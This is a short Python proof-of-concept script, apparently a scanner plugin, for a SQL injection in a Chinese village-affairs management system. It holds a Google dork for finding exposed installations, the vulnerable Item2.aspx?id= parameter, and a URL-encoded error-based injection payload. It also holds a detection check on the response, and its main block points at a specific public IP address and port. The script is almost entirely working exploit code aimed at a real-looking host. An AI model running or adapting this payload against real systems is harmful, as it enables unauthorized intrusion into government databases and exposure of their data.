#!/usr/bin/evn python
#-*-:coding:utf-8 -*-


#Author:wonderkun
#Name: 农友政务系统再一处  sql注入


#Refer:http://wooyun.org/bugs/wooyun-2010-0103706
#Data:2016/1/30
#google dork:村级重大事项及监委会建设监管系统

'''
/newsymItemManage/Item2.aspx?id=1 id sql盲注

'''
def  assign(service,arg):
    if service=="nongyou":
        return True,arg

def audit(arg):
    vun_url=arg+"newsymItemManage/Item2.aspx?id=1"
    payload="%27%20OR%201%20GROUP%20BY%20CONCAT%28md5%281%29%2CFLOOR%28RAND%280%29%2a2%29%29%20HAVING%20MIN%280%29%23"
    code,head,res,errcode,finalurl=curl.curl2(vun_url+payload)

    if code==500  and "c4ca4238a0b923820dcc509a6f75849b1" in res:
        security_hole('sql inject:'+vun_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('nongyou','http://60.214.157.46:8049/')[1])